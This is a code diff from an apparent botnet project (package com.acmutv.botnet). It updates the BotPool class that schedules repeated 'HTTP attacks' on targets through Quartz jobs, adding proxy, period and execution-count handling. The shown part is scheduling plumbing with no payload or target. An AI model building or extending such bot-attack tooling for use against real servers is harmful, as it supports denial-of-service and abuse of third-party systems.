@@ -29,6 +29,8 @@ package com.acmutv.botnet.core.exec;
 import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.attack.QuartzHttpAttacker;
 import com.acmutv.botnet.tool.net.HttpMethod;
+import com.acmutv.botnet.tool.net.HttpProxy;
+import com.acmutv.botnet.tool.time.Interval;
 import lombok.Data;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -41,8 +43,10 @@ import java.net.URL;
 import java.text.ParseException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.ExecutorService;
+import java.util.concurrent.ThreadLocalRandom;
 
 /**
  * This class realizes bot's thread pool, both fixed and scheduled.
@@ -127,7 +131,9 @@ public class BotPool {
    */
   public void scheduleAttackHttp(HttpAttack attack) throws SchedulerException {
     LOGGER.trace("Scheduling {}...", attack);
-    final String jname = String.format("%s.%d", attack.getTarget(), System.currentTimeMillis());
+    final String jname = String.format("http.%s.%s.%d.%d",
+        attack.getMethod().name(), attack.getTarget(),
+        System.currentTimeMillis(), ThreadLocalRandom.current().nextInt());
     final JobKey jobKey = JobKey.jobKey(jname, JOB_GROUP_ATTACKS_HTTP);
     final TriggerKey triggerKey = TriggerKey.triggerKey(jname, JOB_GROUP_ATTACKS_HTTP);
 
@@ -137,6 +143,7 @@ public class BotPool {
     jdata.put("proxy", attack.getProxy());
     jdata.put("properties", attack.getProperties());
     jdata.put("executions", attack.getExecutions());
+    jdata.put("period", attack.getPeriod());
 
     JobDetail job = JobBuilder.newJob(QuartzHttpAttacker.class)
         .withIdentity(jobKey)
@@ -246,20 +253,35 @@ public class BotPool {
   }
 
   /**
-   * Return the list of scheduled attacks.
-   * @return the list of scheduled attacks.
-   * @throws SchedulerException when scheduled attacks cannot be retrieved
+   * Return the list of scheduled HTTP attacks.
+   * @return the list of scheduled HTTP attacks.
+   * @throws SchedulerException when scheduled HTTP attacks cannot be retrieved
    */
-  public List<HttpAttack> getScheduledAttacks() throws SchedulerException {
+  public List<HttpAttack> getScheduledHttpAttacks() throws SchedulerException {
     List<HttpAttack> attacks = new ArrayList<>();
     Set<JobKey> jkeys = this.scheduler.getJobKeys(JOB_GROUP_ATTACKS);
     for (JobKey jkey : jkeys) {
       JobDetail jdetail = this.scheduler.getJobDetail(jkey);
       JobDataMap jmap = jdetail.getJobDataMap();
-      HttpMethod method = (HttpMethod) jmap.get("method");
-      URL target = (URL) jmap.get("target");
+      final HttpMethod method = (HttpMethod) jmap.get("method");
+      final URL target = (URL) jmap.get("target");
       HttpAttack attack = new HttpAttack(method, target);
-      //TODO
+      if (jmap.containsKey("proxy")) {
+        final HttpProxy proxy = (HttpProxy) jmap.get("proxy");
+        attack.setProxy(proxy);
+      }
+      if (jmap.containsKey("properties")) {
+        final Map<String,String> properties = (Map<String,String>) jmap.get("properties");
+        attack.setProperties(properties);
+      }
+      if (jmap.containsKey("executions")) {
+        final int executions = (int) jmap.get("executions");
+        attack.setExecutions(executions);
+      }
+      if (jmap.containsKey("period")) {
+        final Interval period = (Interval) jmap.get("period");
+        attack.setPeriod(period);
+      }
       attacks.add(attack);
     }
     return attacks;
